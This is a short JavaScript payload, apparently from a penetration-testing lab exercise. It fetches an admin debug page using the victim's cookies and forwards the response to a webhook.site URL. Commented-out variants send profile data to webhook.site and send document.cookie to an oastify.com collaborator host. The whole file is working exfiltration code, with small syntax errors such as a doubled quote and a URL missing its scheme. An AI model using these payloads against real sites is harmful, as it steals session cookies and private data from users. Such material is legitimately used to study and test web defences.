// Fetch the debug endpoint - it will include cookies automatically
fetch('http://lab1.demo-pentest.pp.ua/admin/debug', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  // Send the debug response to your webhook
  fetch(''https://webhook.site/20b80dbe-6c7a-486a-bea5-2e9d4e9d047?debug=' + encodeURIComponent(data));
});


//fetch('/api/v0/profile').then(r=>r.text()).then(d=>fetch('https://webhook.site/20b80dbe-6c7a-486a-bea5-2e9d4e9d0470',{method:'POST',body:d}))

//fetch('3qutedu6ifxiplg1m57kl2jbv21tpjd8.oastify.com/test='+document.cookie)
